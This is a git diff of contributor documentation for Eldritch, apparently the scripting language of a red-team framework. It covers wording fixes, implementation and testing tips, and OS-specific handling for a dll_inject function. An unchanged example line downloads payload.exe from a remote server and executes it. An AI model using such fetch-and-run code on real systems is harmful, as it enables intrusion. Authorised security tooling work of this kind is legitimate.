@@ -19,9 +19,8 @@ file.download("http://fileserver.net/payload.exe", "C:/temp/")
 sys.execute("C:/temp/payload.exe")
 ```
 
-_Exceptions to the rule above exist if performing the activities requires the performance of rust. 
-
-Eg. port scanning could be implemented using a for loop and tcp\_connect however due to the performance demand of port scanning a direct implementation in rust makes more sense_
+_Exceptions to the rule above exist if performing the activities requires the performance of rust._
+_Eg. port scanning could be implemented using a for loop and tcp\_connect however due to the performance demand of port scanning a direct implementation in rust makes more sense_
 
 Want to contribute to Eldritch but aren't sure what to build check our ["good first issue" tickets.](https://github.com/KCarretto/realm/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22)
 
@@ -127,7 +126,7 @@ mod tests {
 
 **Implementation tips:**
 * If working with files & network connections use streaming to avoid issues with large files.
-* If your function is likely to error implement additional eldritch function to proactively test if your function will work. Eg. Using `is_file` before performing file operations.
+* If your function depends on resources outside of eldritch (Eg. files, network, etc.) implement helper function that allow the user to proactively test for errors. If your function requires a specific type of file to work consider implementing a function like `is_file` or `is_lnk`.
 
 ### Testing
 Testing can be really daunting especially with complex system functions required by security professionals.
@@ -149,9 +148,22 @@ Any methods added to the Eldritch Standard Library should have tests collocated 
 * Chunk out implementation code into discrete helper functions so each can be tested individually.
 
 ### Example PR for an Eldritch method.
-Check out [this simple example of a PR](https://github.com/KCarretto/realm/pull/69/files) to see what they should look like.
+Check out [this basic example of a PR](https://github.com/KCarretto/realm/pull/69/files) to see what they should look like.
 This PR implements the `file.is_file` function into Eldritch and is a simple example of how to get started.
 
+# OS Specific functions
+---
+
+### Limit changes to the implementation file
+OS specific restrictions should be done in the **Eldritch Implementation** you should only have to worry about it in your: `function_impl.rs`.
+This ensures that all functions are exposed in every version of the Eldritch language.
+To prevent errors and compiler warnings use the `#[cfg(target_os = "windows")]` conditional compiler flag to supress OS specific code.
+For all non supported OSes return an error with a message explaining which OSes are supported.
+**Example**
+```rust
+    #[cfg(not(target_os = "windows"))]
+    return Err(anyhow::anyhow!("This OS isn't supported by the dll_inject function.\nOnly windows systems are supported"));
+```
 
 # Notes about asynchronous Eldritch code
 ---
